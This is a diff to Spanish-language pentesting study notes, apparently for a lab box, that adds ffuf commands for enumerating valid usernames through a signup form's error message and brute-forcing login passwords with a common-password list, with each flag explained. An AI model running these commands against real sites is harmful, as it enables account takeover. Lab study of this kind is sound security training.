@@ -171,13 +171,27 @@ Gobuster trabaja muy bien con sockets y conexiones
 ```
 
 ```bash 
+# Fuzzing para encontrar usuarios validos en una web 
 ❯ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.186.98/customers/signup -mr "username already exists"
 
 	# POST = Metodo a usar porque mandamos data en la peticion 
-	# d = Datos a enviar
-	# H = Encabezado adicional y el server sabra que estamos enviando datos al server
-	# u = Url con la ruta que se va a usar
+	# d = Datos a enviar (Esto dependera de los campos a llenar)
+	# H = Encabezado adicional para que el server sepa que le estamos enviando datos
+	# u = Url con la ruta en donde se encuentra el formulario o campos a llenar 
 	# mr = Texto que buscamos validar y que hemos encontrado como usuario valido
+```
+
+```bash 
+# Hacer fuerza bruta con usuarios recopilados para encontrar su password
+❯ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.186.98/customers/login -fc 200
+
+	# W1 = Lista de usuarios recopilados 
+	# W2 = Lista de diccionario a usar con las passwords 
+	# X = Metodo a usar porque mandamos data a la peticion 
+	# d = Datos a enviar (Esto dependera de los campos a llenar)
+	# H = Encabezado adicional para que el server sepa que le estamos enviando datos
+	# u = Url con la ruta en donde se encuentra el formulario o campos a llenar 
+	# fc = Verificar si hay un codigo de estado HTTP distinto de '200'
 ```
 
 ```bash
